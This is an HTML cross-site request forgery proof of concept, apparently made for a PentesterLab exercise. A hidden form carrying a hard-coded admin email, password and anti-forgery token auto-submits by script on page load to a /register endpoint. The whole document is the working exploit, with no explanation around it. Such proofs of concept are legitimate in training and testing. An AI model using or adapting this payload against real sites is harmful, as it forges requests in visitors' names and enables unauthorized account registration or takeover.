```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF PoC</title>
</head>
<body>
    <form id="csrfForm" action="https://api-ptl-447c46fc-c2eaf85e.libcurl.so/register" method="POST" style="display: none;">
        <input type="hidden" name="email" value="admin@libcurl.So.pentesterlab.com">
        <input type="hidden" name="password" value="uniormanfb1">
        <input type="hidden" name="XSRF-TOKEN" value="OJCwaK5hjvjcnE46pgGkxUrOOdj5T5sNriVjP95Guyywt-PLBNcjmppL47Rl6b_FeeKnlPn-VsFgNfwqhvV17w">
    </form>
    <script>
        document.getElementById('csrfForm').submit();
    </script>
</body>
</html>
```
